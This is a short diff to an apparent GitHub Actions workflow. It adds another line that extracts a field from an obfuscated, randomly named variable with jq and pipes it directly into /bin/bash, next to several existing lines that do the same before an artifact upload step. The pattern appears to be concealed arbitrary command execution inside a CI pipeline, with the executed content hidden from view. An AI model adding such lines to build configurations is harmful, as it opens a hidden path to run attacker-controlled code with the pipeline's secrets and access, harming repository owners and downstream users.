@@ -26,6 +26,7 @@ jobs:
           echo $nppp126 | jq -r .sq3 | /bin/bash
           printf '%s' "$au65" | jq -r .bxb4997 | /bin/bash
           echo $dtqvv20608 | jq -r .m72444 | /bin/bash
+          printf '%s' "$jx34" | jq -r .knaor3 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
